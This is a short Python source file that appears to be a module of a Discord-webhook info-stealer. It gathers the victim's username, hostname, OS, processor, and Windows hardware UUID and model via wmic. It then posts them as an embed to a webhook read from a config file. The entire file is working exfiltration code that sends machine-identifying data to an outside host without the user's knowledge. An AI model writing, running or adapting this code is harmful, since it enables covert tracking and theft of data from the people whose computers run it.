import subprocess
import getpass
import socket
import platform
import requests
from config import Config

cc = Config()

webhook = cc.get_webhook()
eb_color = cc.get_color()

username = getpass.getuser()
hostname = socket.gethostname()

def send_device_information():
    hwid = (str(subprocess.check_output("wmic csproduct get uuid"),
                "utf-8").split("\n")[1].strip())
    name = (str(subprocess.check_output("wmic csproduct get name"),
                "utf-8").split("\n")[1].strip())

    embed = {
        "title":
        f"{name}  -  System Data",
        "description":
        "System Information.",
        "color":
        eb_color,
        "fields": [
            {
                "name": "User",
                "value":
                f"```Host Name: {hostname}\n\nUsername: {username}```",
                "inline": True,
            },
            {
                "name": "System",
                "value":
                f"```OS: {platform.platform()}\n\nProcessor: {platform.processor()}\n\nHWID: {hwid}```",
                "inline": True,
            },
        ],
    }

    requests.post(webhook, json={"embeds": [embed]})